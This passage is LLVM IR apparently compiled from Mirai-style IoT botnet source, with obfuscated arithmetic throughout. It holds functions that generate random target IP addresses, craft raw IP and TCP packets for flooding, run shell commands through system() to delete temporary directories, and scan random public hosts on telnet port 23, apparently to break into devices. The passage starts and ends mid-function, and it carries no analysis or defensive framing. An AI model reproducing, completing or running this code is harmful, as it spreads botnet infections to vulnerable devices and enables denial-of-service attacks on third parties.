  %155 = call i32 @rand() #5
  %156 = srem i32 %155, 223
  %157 = trunc i32 %156 to i8
  store i8 %157, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %158 = call i32 @rand() #5
  %159 = srem i32 %158, 255
  %160 = trunc i32 %159 to i8
  store i8 %160, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %161 = call i32 @rand() #5
  %162 = srem i32 %161, 255
  %163 = trunc i32 %162 to i8
  store i8 %163, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 2), align 1
  %164 = call i32 @rand() #5
  %165 = srem i32 %164, 255
  %166 = trunc i32 %165 to i8
  store i8 %166, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 3), align 1
  br label %14

; <label>:167:                                    ; preds = %152
  %168 = bitcast [16 x i8]* %1 to i8*
  call void @llvm.memset.p0i8.i64(i8* %168, i8 0, i64 16, i32 16, i1 false)
  %169 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %170 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %171 = zext i8 %170 to i32
  %172 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %173 = zext i8 %172 to i32
  %174 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 2), align 1
  %175 = zext i8 %174 to i32
  %176 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 3), align 1
  %177 = zext i8 %176 to i32
  %178 = call i32 (i8*, i8*, ...) @szprintf(i8* %169, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.473, i32 0, i32 0), i32 %171, i32 %173, i32 %175, i32 %177)
  %179 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %180 = call i32 @inet_addr(i8* %179) #5
  ret i32 %180
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #10
  %6 = load i32, i32* %2, align 4
  %7 = xor i32 %5, -1
  %8 = xor i32 %6, -1
  %9 = xor i32 1753366075, -1
  %10 = or i32 %7, %8
  %11 = or i32 1753366075, %9
  %12 = xor i32 %10, -1
  %13 = and i32 %12, %11
  %14 = and i32 %5, %6
  store i32 %13, i32* %3, align 4
  %15 = load i32, i32* %3, align 4
  %16 = call i32 @rand_cmwc()
  %17 = load i32, i32* %2, align 4
  %18 = xor i32 %17, -1
  %19 = and i32 -1, %18
  %20 = xor i32 -1, -1
  %21 = and i32 %17, %20
  %22 = or i32 %19, %21
  %23 = xor i32 %17, -1
  %24 = xor i32 %22, -1
  %25 = xor i32 %16, %24
  %26 = and i32 %25, %16
  %27 = and i32 %16, %22
  %28 = xor i32 %15, -1
  %29 = and i32 -1279040816, %28
  %30 = xor i32 -1279040816, -1
  %31 = and i32 %15, %30
  %32 = xor i32 %26, -1
  %33 = and i32 %32, -1279040816
  %34 = and i32 %26, %30
  %35 = or i32 %29, %31
  %36 = or i32 %33, %34
  %37 = xor i32 %35, %36
  %38 = xor i32 %15, %26
  ret i32 %37
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #6

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %24

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = sub i64 %14, 1349256239211831959
  %16 = add i64 %15, %13
  %17 = add i64 %16, 1349256239211831959
  %18 = add i64 %14, %13
  store i64 %17, i64* %5, align 8
  %19 = load i32, i32* %4, align 4
  %20 = sub i32 %19, -1823620300
  %21 = sub i32 %20, 2
  %22 = add i32 %21, -1823620300
  %23 = sub nsw i32 %19, 2
  store i32 %22, i32* %4, align 4
  br label %6

; <label>:24:                                     ; preds = %6
  %25 = load i32, i32* %4, align 4
  %26 = icmp sgt i32 %25, 0
  br i1 %26, label %27, label %36

; <label>:27:                                     ; preds = %24
  %28 = load i16*, i16** %3, align 8
  %29 = bitcast i16* %28 to i8*
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i64
  %32 = load i64, i64* %5, align 8
  %33 = sub i64 0, %31
  %34 = sub i64 %32, %33
  %35 = add i64 %32, %31
  store i64 %34, i64* %5, align 8
  br label %36

; <label>:36:                                     ; preds = %27, %24
  br label %37

; <label>:37:                                     ; preds = %41, %36
  %38 = load i64, i64* %5, align 8
  %39 = lshr i64 %38, 16
  %40 = icmp ne i64 %39, 0
  br i1 %40, label %41, label %57

; <label>:41:                                     ; preds = %37
  %42 = load i64, i64* %5, align 8
  %43 = xor i64 %42, -1
  %44 = xor i64 65535, -1
  %45 = xor i64 3169732550353968637, -1
  %46 = or i64 %43, %44
  %47 = or i64 3169732550353968637, %45
  %48 = xor i64 %46, -1
  %49 = and i64 %48, %47
  %50 = and i64 %42, 65535
  %51 = load i64, i64* %5, align 8
  %52 = lshr i64 %51, 16
  %53 = sub i64 %49, 5135150289296921630
  %54 = add i64 %53, %52
  %55 = add i64 %54, 5135150289296921630
  %56 = add i64 %49, %52
  store i64 %55, i64* %5, align 8
  br label %37

; <label>:57:                                     ; preds = %37
  %58 = load i64, i64* %5, align 8
  %59 = xor i64 %58, -1
  %60 = and i64 -6370225238535148496, %59
  %61 = xor i64 -6370225238535148496, -1
  %62 = and i64 %58, %61
  %63 = xor i64 -1, -1
  %64 = and i64 %63, -6370225238535148496
  %65 = and i64 -1, %61
  %66 = or i64 %60, %62
  %67 = or i64 %64, %65
  %68 = xor i64 %66, %67
  %69 = xor i64 %58, -1
  %70 = trunc i64 %68 to i16
  ret i16 %70
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #10
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #5
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #5
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #2

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = xor i8 -16, -1
  %15 = xor i8 %13, %14
  %16 = and i8 %15, %13
  %17 = and i8 %13, -16
  %18 = and i8 %16, 5
  %19 = xor i8 %16, 5
  %20 = or i8 %18, %19
  %21 = or i8 %16, 5
  store i8 %20, i8* %12, align 4
  %22 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %23 = bitcast %struct.iphdr* %22 to i8*
  %24 = load i8, i8* %23, align 4
  %25 = xor i8 %24, -1
  %26 = xor i8 15, -1
  %27 = xor i8 -46, -1
  %28 = or i8 %25, %26
  %29 = or i8 -46, %27
  %30 = xor i8 %28, -1
  %31 = and i8 %30, %29
  %32 = and i8 %24, 15
  %33 = and i8 %31, 64
  %34 = xor i8 %31, 64
  %35 = or i8 %33, %34
  %36 = or i8 %31, 64
  store i8 %35, i8* %23, align 4
  %37 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %38 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %37, i32 0, i32 1
  store i8 0, i8* %38, align 1
  %39 = load i32, i32* %10, align 4
  %40 = sext i32 %39 to i64
  %41 = sub i64 0, %40
  %42 = sub i64 20, %41
  %43 = add i64 20, %40
  %44 = trunc i64 %42 to i16
  %45 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %46 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %45, i32 0, i32 2
  store i16 %44, i16* %46, align 2
  %47 = call i32 @rand_cmwc()
  %48 = trunc i32 %47 to i16
  %49 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %50 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %49, i32 0, i32 3
  store i16 %48, i16* %50, align 4
  %51 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %52 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %51, i32 0, i32 4
  store i16 0, i16* %52, align 2
  %53 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %54 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %53, i32 0, i32 5
  store i8 -1, i8* %54, align 4
  %55 = load i8, i8* %9, align 1
  %56 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %57 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %56, i32 0, i32 6
  store i8 %55, i8* %57, align 1
  %58 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %59 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %58, i32 0, i32 7
  store i16 0, i16* %59, align 2
  %60 = load i32, i32* %8, align 4
  %61 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %62 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %61, i32 0, i32 8
  store i32 %60, i32* %62, align 4
  %63 = load i32, i32* %7, align 4
  %64 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %65 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %64, i32 0, i32 9
  store i32 %63, i32* %65, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %7

; <label>:6:                                      ; preds = %1
  store i32 1, i32* %2, align 4
  br label %10

; <label>:7:                                      ; preds = %1
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* %2, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %6
  %11 = load i32, i32* %2, align 4
  ret i32 %11
}

; Function Attrs: noinline nounwind uwtable
define void @RemoveTempDirs() #0 {
  %1 = call i32 @system(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.474, i32 0, i32 0))
  %2 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.475, i32 0, i32 0))
  %3 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.476, i32 0, i32 0))
  %4 = call i32 @system(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.477, i32 0, i32 0))
  %5 = call i32 @system(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.478, i32 0, i32 0))
  %6 = call i32 @system(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.479, i32 0, i32 0))
  %7 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.480, i32 0, i32 0))
  %8 = call i32 @system(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.481, i32 0, i32 0))
  %9 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.482, i32 0, i32 0))
  %10 = call i32 @system(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.483, i32 0, i32 0))
  %11 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.484, i32 0, i32 0))
  %12 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.485, i32 0, i32 0))
  %13 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.486, i32 0, i32 0))
  ret void
}

declare i32 @system(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @TelnetScanner(i32, i32) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [128 x i8], align 16
  %11 = alloca i8, align 1
  %12 = alloca %struct.fd_set, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [256 x i8], align 16
  %17 = alloca i8*, align 8
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca [80 x i8], align 16
  %24 = alloca [80 x i8], align 16
  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  %25 = call i32 @getdtablesize() #5
  %26 = sub i32 %25, -1784537056
  %27 = sub i32 %26, 100
  %28 = add i32 %27, -1784537056
  %29 = sub nsw i32 %25, 100
  store i32 %28, i32* %5, align 4
  %30 = load i32, i32* %5, align 4
  %31 = load i32, i32* %4, align 4
  %32 = icmp sgt i32 %30, %31
  br i1 %32, label %33, label %35

; <label>:33:                                     ; preds = %2
  %34 = load i32, i32* %4, align 4
  store i32 %34, i32* %5, align 4
  br label %35

; <label>:35:                                     ; preds = %33, %2
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %36, align 4
  %37 = call zeroext i16 @htons(i16 zeroext 23) #10
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %40 = getelementptr inbounds [8 x i8], [8 x i8]* %39, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %40, i8 0, i64 8, i32 4, i1 false)
  %41 = call noalias i8* @malloc(i64 1025) #5
  store i8* %41, i8** %17, align 8
  %42 = load i8*, i8** %17, align 8
  call void @llvm.memset.p0i8.i64(i8* %42, i8 0, i64 1025, i32 1, i1 false)
  %43 = load i32, i32* %5, align 4
  %44 = zext i32 %43 to i64
  %45 = call i8* @llvm.stacksave()
  store i8* %45, i8** %19, align 8
  %46 = alloca %struct.telstate_t, i64 %44, align 16
  %47 = bitcast %struct.telstate_t* %46 to i8*
  %48 = load i32, i32* %5, align 4
  %49 = sext i32 %48 to i64
  %50 = mul i64 %49, 5
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 %50, i32 16, i1 false)
  store i32 0, i32* %6, align 4
  br label %51

; <label>:51:                                     ; preds = %69, %35
  %52 = load i32, i32* %6, align 4
  %53 = load i32, i32* %5, align 4
  %54 = icmp slt i32 %52, %53
  br i1 %54, label %55, label %74

; <label>:55:                                     ; preds = %51
  %56 = load i32, i32* %6, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %57
  %59 = bitcast %struct.telstate_t* %58 to i8*
  call void @llvm.memset.p0i8.i64(i8* %59, i8 0, i64 32, i32 16, i1 false)
  %60 = load i32, i32* %6, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %61
  %63 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %62, i32 0, i32 3
  store i8 1, i8* %63, align 1
  %64 = load i8*, i8** %17, align 8
  %65 = load i32, i32* %6, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %66
  %68 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %67, i32 0, i32 9
  store i8* %64, i8** %68, align 8
  br label %69

; <label>:69:                                     ; preds = %55
  %70 = load i32, i32* %6, align 4
  %71 = sub i32 0, 1
  %72 = sub i32 %70, %71
  %73 = add nsw i32 %70, 1
  store i32 %72, i32* %6, align 4
  br label %51

; <label>:74:                                     ; preds = %51
  br label %75

; <label>:75:                                     ; preds = %932, %74
  br label %76

; <label>:76:                                     ; preds = %75
  store i32 0, i32* %6, align 4
  br label %77

; <label>:77:                                     ; preds = %925, %76
  %78 = load i32, i32* %6, align 4
  %79 = load i32, i32* %5, align 4
  %80 = icmp slt i32 %78, %79
  br i1 %80, label %81, label %932

; <label>:81:                                     ; preds = %77
  %82 = load i32, i32* %6, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %83
  %85 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %84, i32 0, i32 7
  %86 = load i32, i32* %85, align 16
  %87 = icmp eq i32 %86, 0
  br i1 %87, label %88, label %95

; <label>:88:                                     ; preds = %81
  %89 = call i64 @time(i64* null) #5
  %90 = trunc i64 %89 to i32
  %91 = load i32, i32* %6, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %92
  %94 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %93, i32 0, i32 7
  store i32 %90, i32* %94, align 16
  br label %95

; <label>:95:                                     ; preds = %88, %81
  %96 = load i32, i32* %6, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %97
  %99 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %98, i32 0, i32 2
  %100 = load i8, i8* %99, align 8
  %101 = zext i8 %100 to i32
  switch i32 %101, label %924 [
    i32 0, label %102
    i32 1, label %247
    i32 2, label %368
    i32 3, label %423
    i32 4, label %468
    i32 5, label %522
    i32 6, label %567
    i32 7, label %670
    i32 8, label %752
  ]

; <label>:102:                                    ; preds = %95
  %103 = load i32, i32* %6, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %104
  %106 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %105, i32 0, i32 3
  %107 = load i8, i8* %106, align 1
  %108 = zext i8 %107 to i32
  %109 = icmp eq i32 %108, 1
  br i1 %109, label %110, label %130

; <label>:110:                                    ; preds = %102
  %111 = load i32, i32* %6, align 4
  %112 = sext i32 %111 to i64
  %113 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %112
  %114 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %113, i32 0, i32 9
  %115 = load i8*, i8** %114, align 8
  store i8* %115, i8** %20, align 8
  %116 = load i32, i32* %6, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %117
  %119 = bitcast %struct.telstate_t* %118 to i8*
  call void @llvm.memset.p0i8.i64(i8* %119, i8 0, i64 32, i32 16, i1 false)
  %120 = load i8*, i8** %20, align 8
  %121 = load i32, i32* %6, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %122
  %124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %123, i32 0, i32 9
  store i8* %120, i8** %124, align 8
  %125 = call i32 @getRandomPublicIP()
  %126 = load i32, i32* %6, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %127
  %129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %128, i32 0, i32 1
  store i32 %125, i32* %129, align 4
  br label %184

; <label>:130:                                    ; preds = %102
  %131 = load i32, i32* %6, align 4
  %132 = sext i32 %131 to i64
  %133 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %132
  %134 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %133, i32 0, i32 3
  %135 = load i8, i8* %134, align 1
  %136 = zext i8 %135 to i32
  %137 = icmp eq i32 %136, 0
  br i1 %137, label %138, label %183

; <label>:138:                                    ; preds = %130
  %139 = load i32, i32* %6, align 4
  %140 = sext i32 %139 to i64
  %141 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %140
  %142 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %141, i32 0, i32 4
  %143 = load i8, i8* %142, align 2
  %144 = sub i8 %143, 31
  %145 = add i8 %144, 1
  %146 = add i8 %145, 31
  %147 = add i8 %143, 1
  store i8 %146, i8* %142, align 2
  %148 = load i32, i32* %6, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %149
  %151 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %150, i32 0, i32 5
  %152 = load i8, i8* %151, align 1
  %153 = add i8 %152, -22
  %154 = add i8 %153, 1
  %155 = sub i8 %154, -22
  %156 = add i8 %152, 1
  store i8 %155, i8* %151, align 1
  %157 = load i32, i32* %6, align 4
  %158 = sext i32 %157 to i64
  %159 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %158
  %160 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %159, i32 0, i32 5
  %161 = load i8, i8* %160, align 1
  %162 = zext i8 %161 to i64
  %163 = icmp eq i64 %162, 19
  br i1 %163, label %164, label %169

; <label>:164:                                    ; preds = %138
  %165 = load i32, i32* %6, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %166
  %168 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %167, i32 0, i32 3
  store i8 1, i8* %168, align 1
  br label %925

; <label>:169:                                    ; preds = %138
  %170 = load i32, i32* %6, align 4
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %171
  %173 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %172, i32 0, i32 4
  %174 = load i8, i8* %173, align 2
  %175 = zext i8 %174 to i64
  %176 = icmp eq i64 %175, 19
  br i1 %176, label %177, label %182

; <label>:177:                                    ; preds = %169
  %178 = load i32, i32* %6, align 4
  %179 = sext i32 %178 to i64
  %180 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %179
  %181 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %180, i32 0, i32 3
  store i8 1, i8* %181, align 1
  br label %925

; <label>:182:                                    ; preds = %169
  br label %183

; <label>:183:                                    ; preds = %182, %130
  br label %184

; <label>:184:                                    ; preds = %183, %110
  %185 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %185, align 4
  %186 = call zeroext i16 @htons(i16 zeroext 23) #10
  %187 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %186, i16* %187, align 2
  %188 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %189 = getelementptr inbounds [8 x i8], [8 x i8]* %188, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %189, i8 0, i64 8, i32 4, i1 false)
  %190 = load i32, i32* %6, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %191
  %193 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %192, i32 0, i32 1
  %194 = load i32, i32* %193, align 4
  %195 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %196 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %195, i32 0, i32 0
  store i32 %194, i32* %196, align 4
  %197 = call i32 @socket(i32 2, i32 1, i32 0) #5
  %198 = load i32, i32* %6, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %199
  %201 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %200, i32 0, i32 0
  store i32 %197, i32* %201, align 16
  %202 = load i32, i32* %6, align 4
  %203 = sext i32 %202 to i64
  %204 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %203
  %205 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %204, i32 0, i32 0
  %206 = load i32, i32* %205, align 16
  %207 = icmp eq i32 %206, -1
  br i1 %207, label %208, label %209

; <label>:208:                                    ; preds = %184
  br label %925

; <label>:209:                                    ; preds = %184
  %210 = load i32, i32* %6, align 4
  %211 = sext i32 %210 to i64
  %212 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %211
  %213 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %212, i32 0, i32 0
  %214 = load i32, i32* %213, align 16
  %215 = load i32, i32* %6, align 4
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %216
  %218 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %217, i32 0, i32 0
  %219 = load i32, i32* %218, align 16
  %220 = call i32 (i32, i32, ...) @fcntl(i32 %219, i32 3, i8* null)
  %221 = and i32 %220, 2048
  %222 = xor i32 %220, 2048
  %223 = or i32 %221, %222
  %224 = or i32 %220, 2048
  %225 = call i32 (i32, i32, ...) @fcntl(i32 %214, i32 4, i32 %223)
  %226 = load i32, i32* %6, align 4
  %227 = sext i32 %226 to i64
  %228 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %227
  %229 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %228, i32 0, i32 0
  %230 = load i32, i32* %229, align 16
  %231 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  %232 = call i32 @connect(i32 %230, %struct.sockaddr* %231, i32 16)
  %233 = icmp eq i32 %232, -1
  br i1 %233, label %234, label %242

; <label>:234:                                    ; preds = %209
  %235 = call i32* @__errno_location() #10
  %236 = load i32, i32* %235, align 4
